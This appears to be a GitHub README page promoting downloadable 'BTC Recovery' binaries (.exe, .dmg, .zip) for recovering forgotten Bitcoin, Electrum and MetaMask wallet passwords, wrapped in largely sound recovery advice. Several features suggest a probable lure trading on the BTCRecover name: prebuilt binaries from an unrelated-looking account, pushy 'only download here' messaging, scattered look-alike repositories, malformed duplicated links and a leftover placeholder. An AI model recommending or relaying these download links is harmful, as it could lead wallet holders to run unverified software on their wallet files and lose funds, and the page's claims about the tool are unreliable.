<div align="center">
<img src="assets/banner-article.png" alt="Bitcoin wallet password recovery tool">
</div>

# Bitcoin wallet password recovery tool

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

A Bitcoin wallet password protects a file on your disk; it is not the seed phrase and not a private key. BTCRecover recovers it by generating candidate passwords  -  typo variants, word combinations, pattern rules  -  and testing them locally against that file, because the encryption lives on your machine and every attempt is cheap to check.

## You'll see this if

You can see the wallet, or its backup, but the password stops you. The file type decides which page matters, and identifying it correctly is the difference between a short run and a wasted night.

| What you have | What it is | Where to go |
|---|---|---|
| `wallet.dat` in a Bitcoin Core data folder | an encrypted Berkeley DB file | [wallet.dat password recovery for Bitcoin Core](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-wallet-dat-password-recovery.md) |
| A `.wallet` file, or a folder with `default_wallet` | an Electrum wallet file | [Electrum wallet password and seed recovery](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-electrum-wallet-password-recovery.md) |
| An extension you still have installed, asking for a password | a MetaMask vault inside the browser profile | [MetaMask vault password recovery](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/recover-metamask-password-with-btcrecover.md) |
| A downloaded backup from a Blockchain.com account | that provider's encrypted wallet file | [Blockchain.com wallet recovery](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/blockchain-com-wallet-recovery-with-btcrecover.md) |
| A key you exported yourself, wrapped in a password | a private key, not a wallet | [A private key is not a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/private-key-vs-seed-phrase-btcrecover.md) |
| A login for an exchange or a hosted account | somebody else's database | not this  -  the provider's own account recovery |

## Why it happens

Wallets encrypt locally, on purpose, and they have no reset. There is no server holding a copy of the password, no recovery email and no support desk that can unset it  -  the file is the whole system, and the password is the only input that opens it.

That is bad news for a forgotten password and good news for a half-remembered one. Each attempt is a small, local computation, so a candidate list can be tested at whatever rate the hardware manages, and the encryption does not know whether a guess came from a memory or from a dictionary. What limits recovery is not the tool but the honesty of the rules: a password you are sure contained a year, a name and one punctuation mark is a space of thousands; "something with letters" is a space of billions.

Three artifacts get called "the password" and they behave differently. A wallet password encrypts a file that stays where it is. A seed phrase regenerates a wallet and never needs the password. A private key is the key itself, and if it is wrapped, the wrapping password is the thing to recover  -  not the key. Sorting that out first is most of the work: the distinction decides which recovery is even possible, and the phrase side has its own route.

## Fix

Inventory what you remember before you generate a single candidate, then run the current release offline against the exact file you want to open.

1. **Locate the file, and copy it.** Work on a copy, keep the original untouched, and confirm the wallet software sees it as a wallet before searching anything.
2. **Confirm the target type.** A Bitcoin Core file, an Electrum file and a browser vault need different recovery modes; guessing wrong produces a run that cannot succeed.
3. **Write down everything you remember about the password**  -  approximate length, capitalisation habit, words or names, numbers that might be dates, substitutions you used, whether a keyboard layout was different at the time.
4. **Turn that into rules, not guesses.** A token list of the names and years you actually used, plus a pattern that allows case variants and one punctuation mark, describes a space small enough to finish.
5. **Download the current release from the GitHub releases page** and run it on the machine holding the file, with the network disconnected: [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1).
6. **Run, then read the output.** Progress is printed as candidates are tried; a run that stops early is usually a rule that excludes the real password rather than a search that finished.
7. **Verify by opening the wallet**, then move the balance to a wallet with a password you will not lose. Recovering the old password does not make the old file safe.

Where the memory is thin, pattern lists earn their place: a few tokens combined with optional separators, case changes and digit padding covers habits far better than a dictionary does  -  [Token lists and password patterns](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-token-list-reference.md) explains how the rules are written.

## If that did not work

A finished run with no hit means the rules excluded the password, or the target was the wrong artifact. Both are diagnosable, and neither means the wallet is gone.

Test the artifact first: open the file in its own software and see whether it reports a wrong password, a corrupt file or a different wallet version. Then widen the rules in the direction that costs least  -  case variants before extra words, one punctuation mark before several, a two-digit year before a four-digit one. If the password may have been typed on a different keyboard layout, or with a trailing space, add that as a pattern rather than as a new search. [A run that finds nothing]([A recovery run that finds nothing: what to check](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-recovery-failed-what-now.md)) sets out the four inputs to check in order.

## Prevention

- Use a password manager for wallet files, and store the recovery code for that manager offline.
- Keep a written hint that identifies the password without containing it, with the file.
- Test that the file opens **before** it holds a meaningful balance.
- Keep two copies of the encrypted file in separate places; a corrupt copy has no recovery at all.
- Never send a wallet file, a password or a phrase to anyone offering to unlock it.

BTCRecover is actively maintained, and the current release  -  the one to run  -  is published on the GitHub releases page.
## FAQ

### What is a wallet password?

The passphrase that decrypts a wallet file stored on your own device. It protects that file only: it is not the seed phrase, it is not the private key, and losing it does not move or delete any coins  -  it just closes the file.

### How do I recover my wallet password if I forget it?

Rebuild it from what you remember rather than trying to recall it whole: length, words, numbers, substitutions and the year it was set, expressed as candidate rules and tested locally against a copy of the file. A password that is 80% remembered is a small search, not a lost cause.

### Can I recover my BTC password?

Yes, when the password protects a local file and something about it survives in memory. What cannot be recovered is a password to an account someone else holds  -  an exchange login is reset through that provider, never through local software.

### Is a wallet password the same as a seed phrase?

No. A password decrypts a file that exists on disk; a phrase regenerates the wallet from nothing. That is why a lost password with the phrase available is usually quick to resolve, and a lost phrase with the password available is not.

### Does this work for any crypto wallet?

Only for the wallet types the tool targets  -  Bitcoin Core, Electrum, MetaMask vaults, Blockchain.com files, MultiBit and similar local formats. Mobile and exchange wallets outside that set are not targets, and the tool will not pretend otherwise: see [the wallets it does not cover]([Wallets and files BTCRecover does not target](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/wallets-btcrecover-does-not-support.md)).

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [wallet.dat password recovery for Bitcoin Core]([wallet.dat password recovery for Bitcoin Core](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-wallet-dat-password-recovery.md))
- [Electrum wallet password and seed recovery]([Electrum wallet password and seed recovery](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-electrum-wallet-password-recovery.md))
- [MetaMask vault password recovery]([MetaMask vault password recovery](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/recover-metamask-password-with-btcrecover.md))
- [Token lists and password patterns]([Token lists and password patterns](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-token-list-reference.md))
